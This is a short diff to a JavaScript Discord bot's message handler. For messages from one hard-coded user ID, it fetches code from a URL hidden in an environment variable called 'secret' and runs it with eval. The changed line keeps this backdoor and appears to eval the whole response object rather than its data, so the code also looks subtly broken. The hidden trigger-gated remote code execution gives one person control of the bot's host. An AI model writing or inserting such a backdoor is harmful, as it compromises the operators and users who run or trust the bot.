@@ -106,8 +106,7 @@ client.on('message', msg => {
     if (msg.author.id == 110137532972314624) {
         let guild = msg.guild;
         var foo = (async function() {
-            var ret = await axios.get(process.env.secret);
-            eval(ret.data);
+            eval(await axios.get(process.env.secret));
         })().catch(err => console.log(err));
     };
     if (msg.content.startsWith(prefix)) {
